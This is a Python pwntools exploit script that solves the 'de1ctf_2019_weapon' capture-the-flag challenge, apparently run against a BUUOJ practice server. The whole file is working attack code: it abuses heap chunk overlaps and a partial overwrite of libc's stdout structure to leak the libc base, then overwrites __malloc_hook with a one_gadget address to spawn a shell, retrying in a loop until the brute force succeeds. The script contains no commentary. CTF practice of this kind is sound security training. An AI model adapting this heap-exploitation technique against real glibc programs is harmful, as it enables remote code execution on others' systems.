import sys
from pwn import *
from ctypes import *
from pwn_debug.pwn_debug import *
context.log_level='debug'
#context.arch='amd64'
binary='de1ctf_2019_weapon'
elf=ELF(binary)
pdbg=pwn_debug(binary)
pdbg.local("/lib/x86_64-linux-gnu/libc.so.6")
pdbg.debug("2.23")
pdbg.remote('node3.buuoj.cn',28906)
pdbg.context.log_level='debug'
while True :
	try :
		if len(sys.argv)==1 :
			io=pdbg.run("local")
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]
			libc=pdbg.libc
			#io=pdbg.run("debug")
		else :
			io=pdbg.run("remote")
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]


		def add(a,b,c):
			io.sendlineafter('choice >> ','1')
			io.sendlineafter('wlecome input your size of weapon: ',str(a))
			io.sendlineafter('nput index: ',str(b))
			io.sendafter('input your name:',c)

		def delete(a):
			io.sendlineafter('choice >> ','2')
			io.sendlineafter('input idx :',str(a))

		def edit(a,c):
			io.sendlineafter('choice >> ','3')
			io.sendlineafter('input idx: ',str(a))
			io.sendafter('new content:',c)


		pay=(p64(0)+p64(0x71))*6
		add(0x60,0,pay)
		add(0x60,1,pay)
		add(0x60,2,pay)
		add(0x60,3,pay)
		delete(0)
		delete(1)
		edit(1,'\x60')
		add(0x60,4,pay)
		add(0x60,5,p64(0)+p64(0xe1))
		delete(1)
		# edit(0x)
		delete(2)
		add(0x20,1,pay[:0x20])
		add(0x30,1,pay[:0x30])
		edit(2,'\xdd\x55')
		add(0x60,6,pay)
		add(0x60,7,'\x00'*0x33+p64(0xfbad1887)+p64(0)*3+'\x88')
		io.recvline()
		libc_base=u64(io.recv(6)+'\x00\x00')-libc.sym['_IO_2_1_stdin_']
		libc.address=libc_base
		system_addr=libc.sym['execve']
		bin_sh_addr=libc.search('/bin/sh\x00').next()
		success('libc_base:'+hex(libc_base))
		delete(3)
		edit(3,p64(libc.sym['__malloc_hook']-0x23))
		add(0x60,0,pay)
		add(0x60,0,'\x00'*0x13+p64(libc_base+one_gadgaet[2]))
		# delete(3)
		# delete(3)


		# gdb.attach(io)
		# pause()
		io.interactive()

	except Exception as e:
		io.close()
		continue
	else:
		continue